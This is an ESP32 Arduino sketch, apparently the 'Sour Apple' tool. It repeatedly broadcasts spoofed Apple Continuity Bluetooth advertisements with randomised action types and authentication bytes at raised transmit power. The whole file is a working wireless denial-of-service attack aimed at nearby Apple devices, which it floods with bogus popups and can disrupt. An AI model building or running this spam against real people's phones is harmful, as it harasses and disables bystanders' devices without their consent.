// ESP32 Sour Apple by RapierXbox


#include <NimBLEDevice.h>

NimBLEAdvertising *pAdvertising;

void setup() {
  NimBLEDevice::init("");

    /**NimBLE ESP32: TX power setting, default 3db */
        #ifdef ESP_PLATFORM
    NimBLEDevice::setPower(ESP_PWR_LVL_P9); /** +9db */
        #else
    NimBLEDevice::setPower(9); /** +9db */
        #endif
    /*  Sets device IO capabilities, each option will trigger a different pairing method.
     *  BLE_HS_IO_DISPLAY_ONLY    - Passkey pairing
     *  BLE_HS_IO_DISPLAY_YESNO   - Numeric comparison pairing
     *  BLE_HS_IO_NO_INPUT_OUTPUT - DEFAULT setting - just works pairing
     *  Pulled from, NimBLE_Server Demo: Demonstrates many NimBLE server features. Author: H2zero  
     */
    NimBLEServer *pServer = NimBLEDevice::createServer();

  pAdvertising = pServer->getAdvertising();
}

NimBLEAdvertisementData getOAdvertisementData() {
  NimBLEAdvertisementData randomAdvertisementData = NimBLEAdvertisementData();
  uint8_t packet[17];
  uint8_t i = 0;

  packet[i++] = 16;    // Packet Length
  packet[i++] = 0xFF;        // Packet Type (Manufacturer Specific)
  packet[i++] = 0x4C;        // Packet Company ID (Apple, Inc.)
  packet[i++] = 0x00;        // ...
  packet[i++] = 0x0F;  // Type
  packet[i++] = 0x05;                        // Length
  packet[i++] = 0xC1;                        // Action Flags
  const uint8_t types[] = { 0x27, 0x09, 0x02, 0x1e, 0x2b, 0x2d, 0x2f, 0x01, 0x06, 0x20, 0xc0 };
  packet[i++] = types[rand() % sizeof(types)];  // Action Type
  esp_fill_random(&packet[i], 3); // Authentication Tag
  i += 3;   
  packet[i++] = 0x00;  // ???
  packet[i++] = 0x00;  // ???
  packet[i++] =  0x10;  // Type ???
  esp_fill_random(&packet[i], 3);

  randomAdvertisementData.addData(std::string((char *)packet, 17));
  return randomAdvertisementData;
}

void loop() {
  delay(40);
  NimBLEAdvertisementData advertisementData = getOAdvertisementData();
  pAdvertising->setAdvertisementData(advertisementData);
  pAdvertising->start();
  delay(20);
  pAdvertising->stop();
}
